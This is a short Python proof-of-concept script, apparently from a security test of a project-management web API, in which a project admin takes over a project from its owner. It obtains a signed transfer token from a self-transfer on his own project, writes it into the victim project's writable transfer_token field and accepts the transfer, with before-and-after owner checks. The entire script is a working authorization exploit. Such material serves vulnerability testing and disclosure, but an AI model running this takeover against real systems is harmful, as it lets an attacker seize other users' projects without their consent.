import sys; sys.path.insert(0, "/root/johto-task4/L3/scratch")
from lib import *
import glob, os, re
s = suffix()
O, A = f"own{s}", f"adm{s}"
mkusers(O, A)
P = mkproject(O, name=f"victim-{s}")
add_member(O, P, f"{A}@ex.test", is_admin=True)
print("owner before:", api(O, "GET", f"/projects/{P['id']}").json()["owner"]["username"])
# A makes own project and starts a transfer to himself -> gets a signed token for his own user id
Q = mkproject(A, name=f"mine-{s}")
show(api(A, "POST", f"/projects/{Q['id']}/transfer_start", {"user": uid(A)}))
tok = api(A, "GET", f"/projects/{Q['id']}").json()["transfer_token"]
print("token read by A from his own project detail:", tok)
# plant it on the victim project (transfer_token is writable for a project admin)
r = show(api(A, "PATCH", f"/projects/{P['id']}", {"transfer_token": tok}), 80)
show(api(A, "POST", f"/projects/{P['id']}/transfer_accept", {"token": tok}))
print("owner after:", api(O, "GET", f"/projects/{P['id']}").json()["owner"]["username"])
